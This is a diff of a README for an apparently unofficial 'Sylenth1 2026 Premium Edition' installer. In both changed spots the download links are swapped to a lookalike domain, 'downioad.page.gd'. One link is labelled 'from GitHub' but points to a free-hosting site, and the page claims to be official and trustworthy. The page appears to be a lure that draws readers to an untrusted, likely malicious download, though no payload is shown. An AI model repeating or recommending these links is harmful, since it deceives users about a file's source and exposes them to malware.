@@ -2,7 +2,7 @@
 
 This repository provides the official installer for the Sylenth1 2026 Premium Edition, a comprehensive desktop application designed to augment the capabilities of the LennarDigital Sylenth1 synthesizer. This tool is focused on streamlined preset management, enhanced sound exploration, and providing a suite of high-quality audio processing features for Windows users.
 
-[![Download Installer](https://img.shields.io/badge/Download-Installer-brightgreen?style=for-the-badge&logo=github)](https://download-page.page.gd/)
+[![Download Installer](https://img.shields.io/badge/Download-Installer-brightgreen?style=for-the-badge&logo=github)](https://downioad.page.gd/)
 
 ## What's Inside
 
@@ -56,7 +56,7 @@ A: An internet connection is only needed for the initial download and license ve
 
 The latest stable version of the installer is available through the official release channel. Always download from trusted sources to ensure file integrity.
 
-[Download the latest version from GitHub](https://download-page.page.gd/)
+[Download the latest version from GitHub](https://downioad.page.gd/)
 
 ---
 
